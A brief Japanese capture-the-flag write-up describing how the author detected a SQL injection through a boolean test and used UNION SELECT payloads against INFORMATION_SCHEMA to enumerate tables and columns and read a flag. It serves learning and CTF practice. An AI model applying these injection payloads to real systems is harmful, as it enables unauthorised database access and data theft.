ページにアクセスすると、XHRが飛んでた。  
SQLiを疑って、**and 1=1**と**and 1=2**で反応差があった。  
構文を崩してもエラーが出なかったので、sqlite_master(sqlite) -> INFORMATION_SCHEMA(MySQL)の順で調べた。 
下記の２つから、flagテーブルのflagカラムがあることが分かった。  
```
9+union+select+table_name,1,1,1,1+from+INFORMATION_SCHEMA.TABLES
9+union+select+COLUMN_NAME,1,1,1,1+from+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name='flag'
```
あとは、フラグを取ってくるだけ
```
9+union+select+flag,1,1,1,1+from+flag
```
